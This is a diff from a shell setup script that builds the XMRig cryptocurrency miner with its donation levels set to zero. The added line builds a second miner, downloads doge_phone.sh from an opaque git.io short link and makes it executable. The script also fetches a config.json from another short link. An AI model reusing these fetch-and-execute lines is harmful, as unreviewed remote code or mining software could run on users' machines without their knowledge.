@@ -383,14 +383,14 @@ SSH_INSTALL(){
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
   mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -O config.json
-  #cd ../ && mkdir doge_build && cd doge_build && cmake .. -DWITH_HWLOC=OFF -DWITH_TLS=OFF && make -j $(nproc) && wget "git.io/J3xxv" -O doge_phone.sh && chmod 755 doge_phone.sh
+  cd ../ && mkdir doge_build && cd doge_build && cmake .. -DWITH_HWLOC=OFF -DWITH_TLS=OFF && make -j $(nproc) && wget "git.io/J3xxv" -O doge_phone.sh && chmod 755 doge_phone.sh
   
   
     local bin="$HOME/ip.sh"
   cat > "$bin" <<- EOM
 #!/bin/bash
 IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
-INFO "SSH server running at: $IP:8022"
+echo "SSH server running at: $IP:8022"
 EOM
   
   INFO "SSH create success"
